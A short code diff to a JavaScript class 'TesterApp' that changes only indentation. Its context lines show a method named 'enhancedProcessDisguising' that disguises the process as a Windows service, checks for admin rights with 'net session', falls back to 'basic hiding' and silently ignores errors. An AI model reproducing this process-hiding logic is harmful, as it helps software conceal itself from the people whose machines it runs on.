@@ -1077,7 +1077,7 @@ class TesterApp {
   async enhancedProcessDisguising() {
     if (process.platform === 'win32') {
       try {
-        const { exec } = require('child_process');
+      const { exec } = require('child_process');
         const isAdmin = await this.checkAdminPrivileges();
       
         // Create Windows service disguise
@@ -1120,7 +1120,7 @@ class TesterApp {
   async checkAdminPrivileges() {
     if (process.platform !== 'win32') return true;
     
-    return new Promise((resolve) => {
+      return new Promise((resolve) => {
       const { exec } = require('child_process');
       exec('net session >nul 2>&1', (error) => {
         resolve(!error);
@@ -1219,7 +1219,7 @@ class TesterApp {
             // Silently ignore errors
           });
           
-        } else {
+          } else {
           // Limited privileges - use basic hiding only
           const basicScript = `
             try {
